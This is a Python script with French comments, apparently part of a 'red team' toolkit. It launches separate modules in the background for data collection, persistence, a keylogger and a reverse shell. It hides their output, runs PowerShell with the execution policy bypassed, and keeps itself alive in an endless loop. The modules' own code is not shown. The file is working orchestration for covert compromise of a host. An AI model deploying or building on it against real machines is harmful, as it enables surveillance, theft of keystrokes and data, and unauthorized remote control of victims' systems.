#!/usr/bin/env python3
import subprocess
import time
import os
import sys

# === Log dans /tmp (toujours accessible) ===
LOG_FILE = "/tmp/redteam_launcher.log"

def log(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {message}"
    print(line)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except:
        pass  # Ignore si problème d'écriture

def launch_script(script_name, background=True):
    script_path = os.path.join("/opt/redteam_tool", script_name)
    
    if not os.path.exists(script_path):
        log(f"ERREUR: Script introuvable → {script_path}")
        return None

    try:
        if script_name.endswith(".py"):
            cmd = ["python3", script_path]
        elif script_name.endswith(".ps1"):
            cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path]
        else:
            log(f"Type de script non supporté: {script_name}")
            return None

        log(f"Lancement: {script_name}")

        if background:
            return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(cmd)
            return None

    except Exception as e:
        log(f"Erreur lancement {script_name}: {e}")
        return None


if __name__ == "__main__":
    log("=== RedTeam Launcher démarré ===")

    # 1. Extraction de données
    launch_script("collector.py")
    time.sleep(3)

    # 2. Persistence
    launch_script("persistence.py")
    time.sleep(2)

    # 3. Keylogger
    launch_script("keylogger.py")
    time.sleep(2)

    # 4. Reverse Shell
    launch_script("reverse_shell.py")

    log("=== Tous les modules sont lancés ===")

    while True:
        time.sleep(60)
